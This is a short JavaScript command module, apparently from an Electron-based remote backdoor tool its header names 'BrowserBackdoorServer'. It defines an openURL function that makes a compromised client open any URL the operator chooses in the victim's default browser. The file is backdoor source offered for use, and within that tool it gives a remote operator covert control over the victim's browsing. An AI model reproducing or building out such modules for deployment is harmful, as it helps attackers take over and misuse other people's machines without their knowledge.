// INTERACTIVE
/*
 * Copyright (c) 2016 IMcPwn  - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Opens a URL in the client's default browser
 * Parameters: URL
 * Returns: undefined
 * Author: IMcPwn
 */

if (typeof electron == 'undefined') electron = require('electron');
if (typeof shell == 'undefined') shell = electron.shell;

openURL = function (url) {
    shell.openExternal(url);
}

return "Usage: openURL(url)";
